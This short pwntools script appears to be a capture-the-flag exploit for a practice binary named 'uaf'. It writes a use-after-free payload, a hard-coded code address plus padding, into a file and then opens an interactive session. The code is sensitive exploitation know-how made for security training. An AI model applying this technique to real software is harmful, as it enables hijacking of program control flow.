#!/usr/bin/python3

from pwn import *

exe = ELF('uaf', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
file = open('flag', 'wb')

file.write(f"\x68\x15\x40\x00\x00\x00\x00\x00aaaaaaaaaaaaaaaa".encode())
p.interactive()
